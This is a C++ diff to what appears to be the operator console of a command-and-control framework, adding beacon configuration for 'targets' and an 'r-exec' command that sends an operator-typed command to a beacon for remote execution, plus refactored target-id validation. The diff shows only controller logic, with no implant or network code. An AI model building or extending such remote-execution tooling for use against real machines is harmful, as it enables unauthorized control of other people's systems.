@@ -8,6 +8,7 @@
 #include <sstream>
 #include <cmdline.hpp>
 #include <nlohmann/json.hpp>
+#include <net.hpp>
 
 using json = nlohmann::json;
 
@@ -88,6 +89,50 @@ void add_target(ARGS args) {
     log("success");
 }
 
+bool validTarget(std::string tid, int maxtarget){
+    int id;
+    try {
+        id = std::stoi(tid);
+    }
+    catch (...) {
+        std::cerr << "error: invalid target id\n";
+        return false;
+    }
+    if (id+1 > maxtarget){
+        std::cerr << "error: target does not exist\n";
+        return false;
+    }
+    return true;
+}
+
+void new_beacon(ARGS args){
+    if (args.size() != 2) {
+        usage_err("new-beacon");
+        return;
+    }
+    int port{};
+    try {
+        port = std::stoi(args[1]);
+    }
+    catch (...) {
+        std::cerr << "error: invalid port number\n";
+        return;
+    }
+    json config = getConfig();
+    if (!validTarget(args[0], config["targets"].size())){
+        usage_err("new-beacon");
+    }
+    int tid = std::stoi(args[0]);
+    port = std::stoi(args[1]);
+    json beacon = {
+        {"alive",false},
+        {"persistent",false},
+        {"port",port}
+    };
+    config["targets"][tid]["beacon"] = beacon;
+    setConfig(config);
+}
+
 void targets(ARGS args){
     if (args.size() != 0){
         usage_err("targets");
@@ -109,20 +154,17 @@ void info(ARGS args){
         usage_err("target-info");
         return;
     }
-    int id{};
-    try {
-        id = std::stoi(args[0]);
-    }
-    catch (...) {
-        std::cerr << "error: invalid target id\n";
+    json config = getConfig();
+    if (!validTarget(args[0], config["targets"].size())){
+        usage_err("target-info");
         return;
     }
-    json config = getConfig();
+    int id = std::stoi(args[0]);
     if (id+1 > config["targets"].size()){
         std::cerr << "error: target does not exist\n";
         return;
     }
-    std::vector properties = { "id", "name", "ip", "uri" };
+    std::vector properties = { "id", "name", "ip", "uri", "beacon" };
     for ( auto &pt : properties) {
         std::string prop = pt;
         std::string propUpper = pt;
@@ -138,14 +180,11 @@ void rm_target(ARGS args){
         return;
     }
     json config = getConfig();
-    int id{};
-    try {
-        id = std::stoi(args[0]);
-    }
-    catch (...) {
-        std::cerr << "error: invalid target id\n";
+    if (!validTarget(args[0], config["targets"].size())){
+        usage_err("rm-target");
         return;
     }
+    int id = std::stoi(args[0]);
     json j = json::array();
     log("erasing target...");
     for (auto &target : config["targets"]){
@@ -161,5 +200,27 @@ void rm_target(ARGS args){
     }
     config["targets"] = j;
     setConfig(config);
-        log("success");
+    log("success");
+}
+
+void r_exec(ARGS args){
+    if (args.size() != 1){
+        usage_err("r-exec");
+        return;
+    }
+    json config = getConfig();
+    if (!validTarget(args[0], config["targets"].size())){
+        usage_err("r-exec");
+        return;
+    }
+    json upd;
+    std::string cmd;
+    std::cout << "Enter command to execute on beacon " << args[0] << ": ";
+    std::getline(std::cin, cmd);
+    std::string k;
+    upd["cmd"] = cmd;
+    std::stringstream ss;
+    ss << upd;
+    k = ss.str();
+    communicate(std::stoi(args[0]), k);
 }
